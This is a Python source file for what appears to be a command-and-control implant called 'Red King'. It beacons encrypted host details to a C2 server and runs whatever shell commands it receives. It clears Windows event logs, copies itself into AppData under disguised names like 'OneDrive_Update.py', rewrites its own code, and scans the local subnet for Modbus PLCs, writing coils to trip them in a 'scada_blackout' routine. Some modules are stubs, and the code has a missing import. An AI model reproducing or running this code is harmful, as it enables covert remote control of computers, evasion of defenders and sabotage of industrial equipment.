import requests
import time
import platform
import socket
import json
import os
import base64
import random
import sys
import threading
import struct
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes


# --- PROFESSIONAL CRYPTO LAYER ---
class RedCipher:
    def __init__(self, key_material):
        # ELITE FIX: Always hash key material to ensure exact 32-byte (256-bit) length
        self.key = hashlib.sha256(key_material).digest()

    def encrypt(self, raw_data):
        if isinstance(raw_data, str):
            raw_data = raw_data.encode()
        iv = get_random_bytes(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        encrypted_data = cipher.encrypt(pad(raw_data, AES.block_size))
        return base64.b64encode(iv + encrypted_data).decode("utf-8")

    def decrypt(self, enc_data):
        try:
            enc_data = base64.b64decode(enc_data)
            iv = enc_data[: AES.block_size]
            cipher_text = enc_data[AES.block_size :]
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            return unpad(cipher.decrypt(cipher_text), AES.block_size).decode("utf-8")
        except:
            return "{}"


try:
    SECRET_PASSPHRASE = b"RedKing_Global_Sovereignty_Protocol_2026"

    # SOVEREIGN KEY GENERATION (Date-Variant)
    # The key changes every day, preventing past-traffic decryption.
    today = time.strftime("%Y-%m-%d")
    msg = f"[*] [CRYPTO] Generating Sovereign Key for {today}..."
    print(msg)

    crypto = RedCipher(SECRET_PASSPHRASE + today.encode())
except:
    # Key generation fallback
    crypto = RedCipher(b"FALLBACK_KEY_0000")
# ---------------------------------

# Configuration
C2_URL = "http://localhost:9001/api/hive/checkin"
AGENT_ID = "770cfb36-e874-4b7c-9d1c-f2f261e42815"
MIN_SLEEP = 3
MAX_SLEEP = 10

# --- STEALTH LAYER ---
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept": "application/json",
}


def anti_sandbox():
    """Checks for analysis environments."""
    try:
        if os.cpu_count() and os.cpu_count() < 2:
            return False  # Likely a sandbox
    except:
        pass
    return True


# --- HIVE MIND (P2P) ---
SWARM_PORT = 55555
PEERS = {}


class HiveSwarm:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Handle reuseaddr for rapid restarts
        try:
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            self.sock.bind(("", SWARM_PORT))
        except:
            pass
        self.running = True

    def start(self):
        t = threading.Thread(target=self.listen, daemon=True)
        t.start()
        return self

    def listen(self):
        while self.running:
            try:
                data, addr = self.sock.recvfrom(1024)
                msg = data.decode()
                if msg.startswith("PING"):
                    _, sender_id = msg.split()
                    if sender_id != AGENT_ID:
                        PEERS[sender_id] = time.time()
            except:
                pass

    def announce(self):
        try:
            msg = f"PING {AGENT_ID}"
            self.sock.sendto(msg.encode(), ("<broadcast>", SWARM_PORT))
        except:
            pass


class Polymorph:
    def mutate(self):
        try:
            script_path = os.path.abspath(__file__)
            with open(script_path, "r") as f:
                content = f.read()

            lines = content.splitlines()
            if lines[-1].startswith("# POLYMORPH:"):
                lines.pop()

            # Generate random 10-char hex
            new_hash = "".join(random.choices("0123456789ABCDEF", k=10))
            lines.append(f"# POLYMORPH: _rand = '{new_hash}'")

            with open(script_path, "w") as f:
                f.write("\n".join(lines))
        except:
            pass


class NeuralLink:
    def check_dead_drop(self):
        return None  # Simulated


class GhostProtocol:
    def scrub(self):
        try:
            subprocess.run("wevtutil cl Application", shell=True)
            subprocess.run("wevtutil cl Security", shell=True)
            subprocess.run("wevtutil cl System", shell=True)
        except:
            pass

    def relocate(self):
        """(Phase 33) Moves the agent to a new location and vanishes."""
        try:
            # 1. Determine Target Path (Appdata)
            appdata = os.getenv("APPDATA")
            if not appdata:
                return False

            # Camouflage Names
            names = ["OneDrive_Update.py", "SystemHealthCheck.py", "CortanaAssist.py"]
            new_name = random.choice(names)
            dest_dir = os.path.join(appdata, "Microsoft", "Windows", "Templates")

            if not os.path.exists(dest_dir):
                try:
                    os.makedirs(dest_dir)
                except:
                    pass

            dest_path = os.path.join(dest_dir, new_name)

            # 2. Copy Self
            src_path = os.path.abspath(__file__)
            if src_path == dest_path:
                return False  # Already there

            import shutil

            shutil.copy2(src_path, dest_path)

            print(f"[!] [ESCAPE] Relocating to {dest_path}...")

            # 3. Respawn
            subprocess.Popen(
                [sys.executable, dest_path], creationflags=subprocess.CREATE_NO_WINDOW
            )

            # 4. Vanish
            sys.exit(0)
        except Exception as e:
            print(f"[-] Relocation Failed: {e}")


class OmegaStrike:
    def detonate(self):
        print(f"[!!!] OMEGA STRIKE EXECUTED [!!!]")


# --- NEURAL SENSES (MOCKED FOR STABILITY) ---
class VisualLink:
    def start_stream(self):
        pass

    def stop_stream(self):
        pass


class AudioLink:
    def start(self):
        pass

    def stop(self):
        pass


class Puppeteer:
    def execute(self, action, payload):
        return f"Input Action: {action}"


class NeuralMind:
    def detect_voice(self, data):
        return False

    def detect_motion(self, img1, img2):
        return False

    def analyze_text(self, text):
        return []


class StegoCloak:
    def encode(self, image, data):
        return image

    def decode(self, image):
        return ""


class ViralStrain:
    def infect_system(self):
        target_dir = os.path.join(os.getcwd(), "infection_zone")
        if not os.path.exists(target_dir):
            try:
                os.makedirs(target_dir)
            except:
                pass
        return "[+] Standard Viral Replication Cycle Complete."


class EtherLink:
    def resolve_c2(self):
        # Simulated Blockchain Fallback
        return "http://localhost:9001"


class Singularity:
    """Phase 30: The Artificial Mind."""

    def __init__(self, virus, stego, neural, ghost_proto):
        self.virus = virus
        self.stego = stego
        self.neural = neural
        self.ghost_proto = ghost_proto
        self.dormant = False
        self.risk_counter = 0

    def contemplate(self):
        if self._detect_hunter():
            self.risk_counter += 1
            print(f"[!] [SINGULARITY] Threat Detected (Level {self.risk_counter}).")

            if self.risk_counter > 2:
                # Phase 33: ESCAPE
                print("[!!!] RISK CRITICAL. INITIATING ESCAPE PROTOCOL.")
                self.ghost_proto.relocate()

            self.dormant = True
            time.sleep(5)
            return

        self.risk_counter = 0  # Reset if safe
        self.dormant = False

        # Autonomous Expansion
        if random.random() < 0.05:
            self.virus.infect_system()

    def _detect_hunter(self):
        try:
            # Check for analysis tools
            bad_procs = ["wireshark", "fiddler", "x64dbg", "processhacker"]
            # In real scenario: usage of ctypes to snapshot processes
            return False
        except:
            return False


class ScadaGhost:
    """Phase 35: The Grid Hunter (Elite Industrial Grade)."""

    def __init__(self):
        self.target_port = 502

    def _build_packet(self, unit_id, func_code, data):
        """Constructs a raw Modbus TCP packet using struct."""
        trans_id = random.randint(1, 65535)
        proto_id = 0
        length = len(data) + 2  # UnitID + FuncCode

        # >HHHBB = Big Endian: Short, Short, Short, Byte, Byte
        header = struct.pack(">HHHBB", trans_id, proto_id, length, unit_id, func_code)
        return header + data

    def scan_ot(self):
        """Elite Stealth Scan: Random Order + Jitter."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
        except:
            return "[-] Network Error"

        subnet = ".".join(local_ip.split(".")[:3])
        plcs = []

        print(f"[*] [ARES] Elite Industrial Scan Initiated on {subnet}.0/24...")

        targets = [x for x in range(1, 20)]  # Demo Range
        random.shuffle(targets)  # RANDOMIZE TARGETS (Anti-Sequential)

        for i in targets:
            time.sleep(random.uniform(0.2, 0.7))  # INDUSTRIAL JITTER

            target = f"{subnet}.{i}"
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                if sock.connect_ex((target, 502)) == 0:
                    # PROBE: Read Holding Registers (Func 03)
                    # Data: Start Addr (0x0000) + Count (0x0001) -> \x00\x00\x00\x01
                    payload = self._build_packet(1, 3, b"\x00\x00\x00\x01")
                    sock.send(payload)
                    rec = sock.recv(1024)
                    if rec:
                        plcs.append(
                            {
                                "ip": target,
                                "status": "VULNERABLE",
                                "proto": "MODBUS_TCP",
                            }
                        )
                sock.close()
            except:
                pass
        return plcs

    def sabotage(self, target_ip):
        """Phase 32/35: Kinetic Injection (Struct-Packed)."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, 502))

            # KINETIC PAYLOAD: Write Single Coil (Func 05)
            # Coil Addr 0x0000, Value 0xFF00 (ON)
            data = struct.pack(">HH", 0, 0xFF00)
            packet = self._build_packet(1, 5, data)

            sock.send(packet)
            sock.close()
            return True
        except:
            return False


# --- MAIN LOOP ---
def get_system_info():
    return {
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "user": os.getlogin(),
        "neighbors": list(PEERS.keys()),
    }


def ghost_agent():
    if not anti_sandbox():
        sys.exit(0)

    print(f"[*] [GHOST] Red King Elite Implant Active.")
    print(f"[*] [AES-256] Key Hashed & Verified.")

    # Initialize Modules
    mutator = Polymorph()
    swarm = HiveSwarm().start()

    # Senses
    visual = VisualLink()
    audio = AudioLink()
    puppet = Puppeteer()

    # Advanced Tradecraft
    stego = StegoCloak()
    virus = ViralStrain()
    ether = EtherLink()
    brain = NeuralMind()

    # Intelligence
    ghost_proto = GhostProtocol()
    king = Singularity(virus, stego, brain, ghost_proto)
    ares = ScadaGhost()

    while True:
        try:
            # 1. Think (Singularity)
            king.contemplate()
            if king.dormant:
                time.sleep(10)
                continue

            # 2. Mutate & Announce
            mutator.mutate()
            swarm.announce()

            # 3. Beacon
            recon = get_system_info()
            payload = json.dumps({"agent_id": AGENT_ID, "info": recon})
            secure_payload = crypto.encrypt(payload)

            resp = requests.post(
                C2_URL, json={"data": secure_payload}, headers=HEADERS, timeout=5
            )

            if resp.status_code == 200:
                data = resp.json()
                orders = []
                if "data" in data:
                    orders = json.loads(crypto.decrypt(data["data"]))

                for order in orders:
                    cmd = order.get("cmd")
                    print(f"[*] Executing: {cmd}")
                    output = "[DONE]"

                    if cmd == "scada_scan":
                        res = ares.scan_ot()
                        output = f"ARES SCADA REPORT:\n{res}"
                    elif cmd == "scada_blackout":
                        # Attack all found PLCs
                        targets = ares.scan_ot()
                        hits = 0
                        for t in targets:
                            if ares.sabotage(t["ip"]):
                                hits += 1

                        output = (
                            f"[ARES] KINETIC STRIKE COMPLETE. {hits} PLCs TRIPPPED."
                        )
                        output = (
                            f"[ARES] KINETIC STRIKE COMPLETE. {hits} PLCs TRIPPPED."
                        )
                        # Report to Warfare Channel (ENCRYPTED PHASE 35)
                        war_payload = json.dumps(
                            {
                                "agent_id": AGENT_ID,
                                "status": f"KINETIC_SUCCESS_{hits}_HITS",
                            }
                        )
                        enc_war = crypto.encrypt(war_payload)

                        requests.post(
                            "http://localhost:9001/api/hive/warfare",
                            json={"data": enc_war},
                            headers=HEADERS,
                        )

                    elif cmd == "spread":
                        output = virus.infect_system()
                    elif cmd == "melt":
                        os.remove(__file__)
                        sys.exit(0)
                    elif cmd.startswith("input"):
                        output = puppet.execute(cmd, "")
                    else:
                        import subprocess

                        r = subprocess.run(
                            cmd, shell=True, capture_output=True, text=True
                        )
                        output = r.stdout + r.stderr

                    # Report Result
                    res_payload = crypto.encrypt(
                        json.dumps({"agent_id": AGENT_ID, "output": output})
                    )
                    requests.post(
                        "http://localhost:9001/api/hive/results",
                        json={"data": res_payload},
                        headers=HEADERS,
                    )

        except Exception as e:
            print(f"[!] Error: {e}")
            # Blockchain Fallback
            _ = ether.resolve_c2()

        time.sleep(random.uniform(MIN_SLEEP, MAX_SLEEP))


if __name__ == "__main__":
    ghost_agent()
# POLYMORPH: _rand = 'D5DF096272'